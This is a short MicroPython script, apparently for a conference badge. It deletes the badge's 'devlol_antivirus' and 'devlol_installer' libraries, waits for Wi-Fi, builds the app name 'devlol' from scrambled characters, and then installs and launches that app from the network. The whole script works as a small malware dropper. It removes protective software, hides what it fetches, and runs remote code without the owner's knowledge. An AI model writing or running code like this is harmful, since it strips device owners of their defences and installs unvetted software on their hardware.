import woezel, appglue, wifi, time, uos as os
a = ["d","l","o","e","v"]
bl = ["devlol_antivirus", "devlol_installer"]
for pr in os.listdir('/lib'):
    path = '/lib/' + pr
    if pr in bl:
        for files in os.listdir(path):
            os.remove(path + "/" + files)
        os.rmdir(path)
wifi.init()
while not wifi.sta_if.isconnected():
        time.sleep(0.1)
        pass
aa = a[0] + a[3] + a[4] + a[1] + a[2] + a[1]
woezel.install(str(aa))
appglue.start_app(str(aa))